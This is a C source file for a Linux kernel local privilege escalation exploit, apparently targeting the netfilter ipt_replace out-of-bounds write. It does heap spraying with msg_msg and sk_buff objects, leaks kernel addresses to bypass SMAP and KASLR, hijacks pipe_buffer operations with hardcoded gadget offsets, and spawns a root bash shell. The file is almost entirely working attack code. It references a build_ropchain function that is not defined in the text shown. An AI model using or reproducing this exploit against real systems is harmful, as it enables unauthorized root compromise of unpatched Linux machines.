#define _GNU_SOURCE

#define NUM_MSQID 4096
#define MSG_MARKER (NUM_MSQID << 1)

#define NUM_SOCKPAIRS 32
#define NUM_PIPES 32

#define SKB_SHARED_INFO_SIZE 0x140

#define TYPE_PRIMARY 1
#define TYPE_SECONDARY 2

#define JUNK 0x4141414141414141

#define ANON_PIPE_BUF_TRY_STEAL 0x2f6c80
#define GENERIC_PIPE_BUF_GET 0x2f6800

#define PUSH_RSI_JMP_RSI_39 0x6e9783
#define POP_RSP 0x19c4b0
#define ADD_RSP_D0 0x6db59

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <net/if.h>
#include <linux/netfilter_ipv4/ip_tables.h>

// #include "../exploitlib/exploitlib.h" // fix this with makefile

void spawn_shell();
unsigned long user_eip = (unsigned long)spawn_shell;

int msqid[NUM_MSQID];
int sockpairs[NUM_SOCKPAIRS][2];
int pipefd[NUM_PIPES][2];

struct msg_msgseg {
	uint64_t next;
};

struct msg_msg {
	uint64_t l_next;
	uint64_t l_prev;
	uint64_t m_type;
	uint64_t m_ts;
	uint64_t next;
	uint64_t security;
};

struct {
	long type;
	char text[4096 - sizeof(struct msg_msg)];
} msg_primary;

struct {
	long type;
	char text[1024 - sizeof(struct msg_msg)];
} msg_secondary;

struct pipe_buf_operations {
    uint64_t confirm;
    uint64_t release;
    uint64_t try_steal;
    uint64_t get;
};

struct pipe_buffer {
    uint64_t page;
    unsigned int offset;
    unsigned int len;
    uint64_t ops;
    unsigned int flags;
    uint64_t private;
};

int real_idx = -1;
int fake_idx = -1;

void dbg() {
	puts("Paused.");
	fgetc(stdin);
}

int trigger_oob_write() {
	//create new user and network namespace so that the current process has the required CAP_NET_ADMIN
	if (unshare(CLONE_NEWUSER)) {
		puts("[-] Failed to create user namespace");
		return -1;
	}
	if (unshare(CLONE_NEWNET)) {
		puts("[-] Failed to create network namespace");
		return -1;
	}
	
	//open AF_INET TCP socket
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		return -1;
	}
	
	//initialize data structure for setsockopt
	struct __attribute__((__packed__)) {
		struct ipt_replace repl;
		struct ipt_entry entry;
		struct ipt_entry_match match;
		char buf[0xf06];
		struct xt_entry_target target;
	} data;
	memset(&data, 0, sizeof(data));
	
	//initialize ipt_replace header
	data.repl.num_counters = 1;
	data.repl.size = sizeof(data.entry) + sizeof(data.match) + sizeof(data.buf) + sizeof(data.target);
	data.repl.num_entries = 1;
	
	//specify the iptables entry
	data.entry.target_offset = sizeof(data.entry) + sizeof(data.match) + sizeof(data.buf);
	data.entry.next_offset = data.entry.target_offset + sizeof(data.target);
	
	//specify the entry match
	data.match.u.user.match_size = sizeof(data.match) + sizeof(data.buf);
	strcpy(data.match.u.user.name, "tcp");
	
	//specify target: note that targetsize must not be 8-byte aligned in order to trigger the OOB write
	data.target.u.target_size = sizeof(data.target);
	strcpy(data.target.u.user.name, "REJECT");
	
	//trigger the OOB write
	setsockopt(fd, IPPROTO_IP, IPT_SO_SET_REPLACE, &data, sizeof(data));
	
	return fd;
}

int spray_skbuff(void *skbuf_data) {
	size_t sz = 1024 - SKB_SHARED_INFO_SIZE;
	for (int i = 0; i < NUM_SOCKPAIRS; i++) {
		//note that the total size to write must be offset by SKB_SHARED_INFO_SIZE
		//because sizeof(struct skb_shared_info) is appended to the provided size before allocating kernel heap memory
		if (write(sockpairs[i][0], skbuf_data, sz) < 0) {
			perror("[-] socketpair spray");
			return -1;
		}
	}
	return 0;
}

int free_skbuff() {
	size_t sz = 1024 - SKB_SHARED_INFO_SIZE;
	char recvbuf[sz];
	for (int i = 0; i < NUM_SOCKPAIRS; i++) {
		if (read(sockpairs[i][1], recvbuf, sz) < 0) {
			perror("[-] free sk_buff");
			return -1;
		}
	}
	return 0;
}

int cleanup() {
	for (int i = 0; i < NUM_MSQID; i++) {
		if ((msqid[i] != -1) && (i != fake_idx)) {
			if (msgctl(msqid[i], IPC_RMID, NULL) == -1) {
				perror("[-] msgctl cleanup");
				return -1;
			}
		}
	}
	return -1;
}

void spawn_shell() {
	puts("\nSTAGE 4: CLEANUP");
	//close any open read ends of the pipes
	for (int i = 0; i < NUM_PIPES; i++) {
		close(pipefd[i][0]);
	} 
	puts("[*] Closed all read ends of the pipes");
	
	//cleanup all benign msgs
	cleanup();
	puts("[*] Cleaned up all benign messages");
	
	if (!getuid()) {
		//change network namespace back to what it was
		if (setns(open("/proc/1/ns/net", O_RDONLY | O_CLOEXEC), 0) ==  -1) {
			puts("[-] Failed to change network namespace");
			exit(-1);
		}
		puts("[*] Changed network namespace back");
	
		//spawn shell
		puts("[+] Got root, spawning shell...");
		char *args[] = {"/bin/bash", "-i", NULL};
		execvp(args[0], args);
	}
	else {
		printf("[-] Did not get root, UID = %d\n", getuid());
		exit(-1);
	}
}

unsigned long user_cs, user_ss, user_eflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, esp;"
        "pushf;"
        "pop user_eflags;"
        ".att_syntax;"
    );
}

int main() {
	//intitialize primary message data
	memset(&msg_primary.text, 0, sizeof(msg_primary.text));
	*((int *)&msg_primary.text + 1) = TYPE_PRIMARY;
	
	//intitialize secondary message data
	memset(&msg_secondary.text, 0, sizeof(msg_secondary.text));
	*((int *)&msg_secondary.text + 1) = TYPE_SECONDARY;
	
	//initialize msqid array
	for (int i = 0; i < NUM_MSQID; i++) {
		msqid[i] = -1;
	}
	
	//save register state for when the CPU needs to return to usermode from the ropchain
	save_state();
	
	puts("STAGE 1: MEMORY CORRUPTION");	
	//create message queues
	for (int i = 0; i < NUM_MSQID; i++) {
		msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
		if (msqid[i] == -1) {
			perror("[-] msgget");
			return cleanup();
		}
	}
	printf("[*] Created %d message queues\n", NUM_MSQID);
	
	//spray primary messages, labeled by index in the buffer
	for (int i = 0; i < NUM_MSQID; i++) {
		msg_primary.type = i + 1;
		*((int *)&msg_primary.text) = i;
		if (msgsnd(msqid[i], &msg_primary, sizeof(msg_primary.text), 0)) {
			perror("[-] primary msgsnd");
			return cleanup();
		}
	}
	printf("[*] Sprayed primary %d messages corresponding to %d byte allocations\n", NUM_MSQID, sizeof(msg_primary.text) + sizeof(struct msg_msg));
	
	//spray secondary messages, labeled by index in the buffer
	for (int i = 0; i < NUM_MSQID; i++) {
		msg_secondary.type = (i + 1) | MSG_MARKER;
		*((int *)&msg_secondary.text) = i;
		if (msgsnd(msqid[i], &msg_secondary, sizeof(msg_secondary.text), 0)) {
			perror("[-] secondary msgsnd");
			return cleanup();
		}
	}
	printf("[*] Sprayed secondary %d messages corresponding to %d byte allocations\n", NUM_MSQID, sizeof(msg_secondary.text) + sizeof(struct msg_msg));
	
	//create a hole in every 1024th primary message so that struct xt_table_info can fit there
	for (int pos = 1024 - 1; pos < NUM_MSQID; pos += 1024)
	{
		if (msgrcv(msqid[pos], &msg_primary, sizeof(msg_primary.text), 0, IPC_NOWAIT) < 0) {
			perror("[-] msgrcv without MSG_COPY");
			return cleanup();
		}
	}
	puts("[*] Created holes in kmalloc-4096 by freeing every 1024th primary message");
	
	//trigger the OOB write
	int fd = trigger_oob_write();
	if (fd < 0) {
		puts("[-] Failed to trigger OOB write");
		return -1;
	}
	else {
		printf("[*] Attempted to trigger OOB write, netfilter socket fd = %d\n", fd);
	}
	
	puts("[*] Checking for memory corruption...");
	for (int i = 0; i < NUM_MSQID; i++) {
		if ((msqid[i] != -1) && ((i + 1) % 1024 != 0)) {
			memset(&msg_secondary.text, 0, sizeof(msg_secondary.text));
			if (msgrcv(msqid[i], &msg_secondary, sizeof(msg_secondary.text), 1, IPC_NOWAIT | MSG_COPY) < 0) {
				perror("[-] msgrcv with MSG_COPY");
				return -1;
			}
			
			int retrieved = *((int *)&msg_secondary.text);
			if (retrieved != i) {
				real_idx = retrieved;
				fake_idx = i;
				break;
			}
		}
	}
	if (real_idx == -1 || fake_idx == -1) {
		puts("[-] Failed to corrupt any primary messages");
		return cleanup();
	}
	printf("[+] Successfully corrupted primary messages: real_idx = 0x%x, fake_idx = 0x%x\n", real_idx, fake_idx);
	if (msqid[real_idx] == -1 || msqid[fake_idx] == 1) {
		puts("[-] One of the relevant msqids is -1");
		return -1;
	}
	
	
	printf("\nSTAGE 2: SMAP BYPASS\n");
	
	//free the secondary message using the real index, so only fake_idx can access it
	memset(&msg_secondary, 0, sizeof(msg_secondary));
	if (msgrcv(msqid[real_idx], &msg_secondary, sizeof(msg_secondary.text), (real_idx + 1) | MSG_MARKER, 0) < 0) {
		perror("[-] Error in freeing secondary message using real_idx");
		return -1;
	}
	
	//spray struct skb_buff's to try and reclaim the hole in kmalloc-1024
	for (int i = 0; i < NUM_SOCKPAIRS; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockpairs[i])) {
			perror("[-] socketpair");
			return -1;
		}
	}
	printf("[*] Initialized %d socketpairs\n", NUM_SOCKPAIRS);
	
	//send the fake msg_msg into each of them, with the m_ts attribute set to something larger than 1024 to get a leak
	struct msg_msg header;
	header.l_next = JUNK;
	header.l_prev = JUNK;
	header.m_type = 0x1337;
	header.m_ts = 4096 - sizeof(struct msg_msg);
	header.next = 0;
	header.security = 0;
	struct {
		struct msg_msg msg_header;
		char buf[header.m_ts];
	} msg_sockbuf;
	msg_sockbuf.msg_header = header;
	memset(msg_sockbuf.buf, 0, sizeof(msg_sockbuf.buf));
	if (spray_skbuff(&msg_sockbuf) < 0) {
		return -1;
	}
	printf("[*] Sent forged msg_msg headers to each of the the %d socket buffers\n", NUM_SOCKPAIRS);
	
	//leak memory past the end of the msg_msg allocation using the rogue m_ts
	memset(&msg_primary.text, 0, sizeof(msg_primary.text));
	if (msgrcv(msqid[fake_idx], &msg_primary, sizeof(msg_primary.text), 1, IPC_NOWAIT | MSG_COPY) < 0) {
		perror("[-] msgrcv kheap leak");
		return cleanup();
	}
	uint64_t *dump = (uint64_t *)&msg_primary.text;
	uint64_t primary_leak = dump[123];
	if ((primary_leak & 0xffff800000000000) != 0xffff800000000000) {
		printf("[-] Found invalid kheap address 0x%llx\n", primary_leak);
		return -1;
	}
	printf("[+] Leaked primary message address 0x%llx\n", primary_leak);
	
	//free and reallocate sk_buff objects to plant a new struct msg_msg
	//this time, the leaked primary message address is specified as the next segment to allow leaking the address of the controlled secondary message
	header.l_next = JUNK;
	header.l_prev = JUNK;
	header.m_type = 0x1337;
	header.m_ts = 8192 - sizeof(struct msg_msg);
	header.next = primary_leak - sizeof(struct msg_msgseg);
	header.security = 0;
	msg_sockbuf.msg_header = header;
	memset(msg_sockbuf.buf, 0, sizeof(msg_sockbuf.buf));
	if (free_skbuff() < 0) {
		return -1;
	}
	if (spray_skbuff(&msg_sockbuf) < 0) {
		return -1;
	}
	puts("[*] Freed and reallocated sk_buff objects to contain a msg_msg with valid next address");
	
	//get the primary message's msg_msg header and calculate the address of the controlled region
	struct {
		long type;
		char buf[8192 - sizeof(struct msg_msg)];
	} msgleakrecv;
	memset(msgleakrecv.buf, 0, sizeof(msgleakrecv.buf));
	if (msgrcv(msqid[fake_idx], &msgleakrecv, sizeof(msgleakrecv.buf), 1, IPC_NOWAIT | MSG_COPY) < 0) {
		perror("[-] msgrcv secondary message address leak");
		return -1;
	}
	dump = (uint64_t *)&msgleakrecv.buf;
	uint64_t controlled_addr = dump[506] - 1024;
	if (((controlled_addr & 0xffff800000000000) != 0xffff800000000000) || ((controlled_addr & 0xffff) != 0)) {
		printf("[-] Invalid leaked address 0x%llx, the controlled address must be a high virtual address that is 0x10000 aligned\n", controlled_addr);
		return -1;
	}
	printf("[+] Found address 0x%llx of the controlled block in kmalloc-1024\n", controlled_addr);
	
	//now that the leak is done, fix the secondary message using the sk_buff spray so it can be freed properly using fake_idx 
	header.l_next = controlled_addr;
	header.l_prev = controlled_addr;
	header.m_type = 0x1337;
	header.m_ts = sizeof(msg_secondary.text);
	header.next = 0;
	header.security = 0;
	struct {
		struct msg_msg msg_header;
		char buf[header.m_ts];
	} msg_cleanup;
	msg_cleanup.msg_header = header;
	memset(msg_cleanup.buf, 0, sizeof(msg_cleanup.buf));
	if (free_skbuff() < 0) {
		return -1;
	}
	if (spray_skbuff(&msg_cleanup) < 0) {
		return -1;
	}
	puts("[*] Freed and reallocated sk_buff objects to plant msg_msg header with the proper size and without the next pointer");
	
	//cleanup by freeing the secondary message corresponding to fake_idx
	if (msgrcv(msqid[fake_idx], &msg_secondary, sizeof(msg_secondary.text), 0x1337, 0) < 0) {
		perror("[-] freeing secondary message for fake_idx");
		return -1;
	}
	
	puts("\nSTAGE 3: KASLR BYPASS AND KERNEL CODE EXECUTION");
	
	//spray pipe buffers to reclaim the controlled region
	for (int i = 0; i < NUM_PIPES; i++) {
		if (pipe(pipefd[i])) {
			perror("[-] creating pipes");
			return -1;
		}
		if (write(pipefd[i][1], "lol", 3) < 0) {
			perror("[-] writing to pipes");
			return -1;
		}
	}
	printf("[*] Sprayed %d pipe buffers\n", NUM_PIPES);
	
	//read the address of anon_pipe_buf_ops from the buffer by trying each of the sockets, and copy the correct result for later use
	uint64_t anon_pipe_buf_ops = 0;
	char pipe_leak[1024 - SKB_SHARED_INFO_SIZE];
	char recvbuffer[sizeof(pipe_leak)];
	dump = (uint64_t *)recvbuffer;
	for (int i = 0; i < NUM_SOCKPAIRS; i++) {
		if (read(sockpairs[i][1], recvbuffer, sizeof(recvbuffer)) < 0) {
			perror("[-] read from socketpair");
			return -1;
		}
		if (((dump[2] & 0xffff800000000000) == 0xffff800000000000) && ((dump[2] & 0xfffff) == 0x78380)) {
			anon_pipe_buf_ops = dump[2];
			memcpy(pipe_leak, recvbuffer, sizeof(pipe_leak));
		}
	}
	if (anon_pipe_buf_ops == 0) {
		puts("[-] Failed to leak valid address for anon_pipe_buf_ops");
		return -1;
	}
	printf("[+] Found address 0x%llx for anon_pipe_buf_ops\n", anon_pipe_buf_ops);
	uint64_t kbase = anon_pipe_buf_ops - 0x1078380;
	printf("[+] Found kernel base address 0x%llx\n", kbase);
	
	//modify struct pipe_buffer vtable pointer to point inside the controlled block
	struct pipe_buffer *buf = (struct pipe_buffer *)pipe_leak;
	buf->ops = controlled_addr + 0x48;
	
	//create the fake vtable at the specified address, and set all elements except the release function pointer to what they should be
	struct pipe_buf_operations *ops = (struct pipe_buf_operations *)(pipe_leak + 0x48);
	ops->confirm = 0;
	ops->release = kbase + PUSH_RSI_JMP_RSI_39;
	ops->try_steal = kbase + ANON_PIPE_BUF_TRY_STEAL;
	ops->get = kbase + GENERIC_PIPE_BUF_GET;
	
	//use JOP gadget to add 0xd0 to rsp to give the stack some space to grow without crashing into structs at the top of the buffer
	*((uint64_t *)(pipe_leak + 0x39)) = kbase + POP_RSP;
	
	//when the above returns it will look at the top of the buffer for the saved return address, so add 0xd0 to rsp
	*((uint64_t *)pipe_leak) = kbase + ADD_RSP_D0;
	
	//plant ropchain at offset 0xd0
	uint64_t *rop = (uint64_t *)(pipe_leak + 0xd8);
	build_ropchain(kbase, rop);
	
	printf("[*] Created ROPchain payload\n");
	
	//spray the payload and reclaim controlled address
	if (spray_skbuff(pipe_leak)) {
		return -1;
	}
	printf("[*] Used the sk_buff spray to plant the payload in the controlled block\n");
		
	//cleanup: close any open sockets
	for (int i = 0; i < NUM_SOCKPAIRS; i++) {
		close(sockpairs[i][0]);
		close(sockpairs[i][1]);
	}
	close(fd);
	puts("[*] Closed all socketpairs and netfilter socket");
	
	//trigger the function pointer by closing all created pipes
	printf("[*] Attempting to close all %d pipes to trigger the pipe's release function pointer\n", NUM_PIPES);
	for (int i = 0; i < NUM_PIPES; i++) {
		//close write end first as it will not trigger a pipe buffer release
		close(pipefd[i][1]);
	}
	puts("[*] Closed all write ends of the pipes");
	for (int i = 0; i < NUM_PIPES; i++) {
		//close read end to trigger pipe buffer release
		close(pipefd[i][0]);
	}
	
	printf("[!] How did we even get here??? Anyways, debug: UID = %d\n", getuid());
	dbg();
	return -1;
}
